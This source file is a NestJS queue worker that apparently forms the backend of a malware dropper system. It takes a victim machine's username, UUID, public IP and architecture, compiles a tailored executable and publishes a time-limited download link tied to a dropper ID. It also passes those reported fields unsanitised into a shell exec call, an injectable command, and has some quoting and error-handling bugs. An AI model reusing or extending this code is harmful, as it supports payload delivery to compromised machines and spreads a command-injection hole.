import { Job } from 'bull';
import {
  OnQueueActive,
  OnQueueCompleted,
  Process,
  Processor,
} from '@nestjs/bull';
import { MachineInfo } from './interfaces/machine.interface';
import { join, basename } from 'node:path';
import { exec } from 'child_process';
import { Inject, Logger } from '@nestjs/common';
import { MINIO_CONNECTION } from 'nestjs-minio';
import { ConfigService } from '@nestjs/config';
import { InjectRepository } from '@nestjs/typeorm';
import { UrlRegistry } from '../entities/url-registry.entity';
import { Repository } from 'typeorm';

const URL_EXPIRATION_TIME = 3600;
const BUCKET_NAME = 'core';

@Processor('build')
export class BuildConsumer {
  private readonly logger = new Logger(BuildConsumer.name);

  constructor(
    @Inject(MINIO_CONNECTION) private readonly minioClient,
    private configService: ConfigService,
    @InjectRepository(UrlRegistry)
    private urlRegistryRepository: Repository<UrlRegistry>,
  ) {}
  @Process('build-job')
  async handleBuild(job: Job) {
    console.log(job.data);
    const { machineData, dropperId } = job.data as {
      machineData: MachineInfo;
      dropperId: string;
    };

    const isWin = process.platform === 'win32';

    const projectRoot = this.configService.get<string>('rootDir');

    const scriptName = isWin
      ? 'build.bat ${projectRoot}'
      : `build.sh ${projectRoot}`;

    const scriptRoot = this.configService.get<string>('scriptCompile');

    const archMapper = {
      x64: 'amd64',
      x86: '386',
    };

    const scriptArgs = [
      machineData.username,
      machineData.uuid,
      machineData.publicIp,
      archMapper[machineData.arch],
    ];

    this.logger.debug(scriptArgs);

    const scriptPath = join(scriptRoot, scriptName);

    this.logger.debug(
      `Running script ${scriptPath} with args ${scriptArgs}...`,
    );

    const command = `${scriptPath} ${scriptArgs.join(' ')}`;

    const result: string = await new Promise((resolve, reject) => {
      exec(command, async (error, stdout, stderr) => {
        if (error) {
          this.logger.error(`Error: ${error}`);
          return reject(error);
        }

        if (stderr) {
          this.logger.error(`stderr: ${stderr}`);
          return reject(error);
        }

        const generatedExe = stdout.replace('\n', '');
        const generatedExePath = join(scriptRoot, generatedExe);

        this.logger.debug(
          `Generated exe: ${generatedExe} at ${generatedExePath}`,
        );
        resolve(generatedExePath);
      });
    });

    const file = result.replace('\r', '');
    const timestamp =
      Math.round(new Date().getTime() / 1000) + URL_EXPIRATION_TIME;

    const metaData = {
      'Content-Type': 'application/octet-stream',
      'End-Of-Validity': new Date(timestamp * 1000).toISOString(),
    };

    this.logger.debug(`Uploading file ${basename(file)} to minio...`);

    this.minioClient.fPutObject(
      BUCKET_NAME,
      basename(file),
      file,
      metaData,
      function (err, etag) {
        if (err) {
          return console.log(err);
        }
        console.log('File uploaded successfully.');
      },
    );

    const url = this.minioClient.presignedUrl(
      'GET',
      BUCKET_NAME,
      basename(file),
      2 * 60 * 60,
      async (err, presignedUrl) => {
        if (err) return console.error(err);

        const urlRegistry = new UrlRegistry();
        urlRegistry.dropperId = dropperId;
        urlRegistry.url = presignedUrl;
        urlRegistry.timestamp = new Date(timestamp * 1000).toISOString();

        console.log(urlRegistry);

        await this.urlRegistryRepository.save(urlRegistry);
      },
    );
  }

  @OnQueueActive()
  onActive(job: Job) {
    this.logger.debug(
      `Processing job ${job.id} of type ${job.name} with data ${job.data}...`,
    );
  }

  @OnQueueCompleted()
  onCompleted(job: Job) {
    this.logger.debug(
      `Completed job ${job.id} of type ${job.name} with result ${job.returnvalue}`,
    );
  }
}
